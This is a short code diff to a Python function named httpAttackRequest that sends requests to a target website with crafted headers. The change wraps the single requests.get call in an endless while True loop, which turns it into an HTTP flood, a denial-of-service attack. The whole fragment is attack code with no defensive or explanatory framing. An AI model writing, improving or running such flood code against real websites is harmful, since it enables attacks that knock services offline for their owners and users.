@@ -11,4 +11,6 @@ def httpAttackRequest(website, userAgent, referer):
 	'Connection': 'keep-alive', \
 	'Host': website
 	}
-	requests.get(website, headers=headers)
+	
+	while True:
+		requests.get(website, headers=headers)
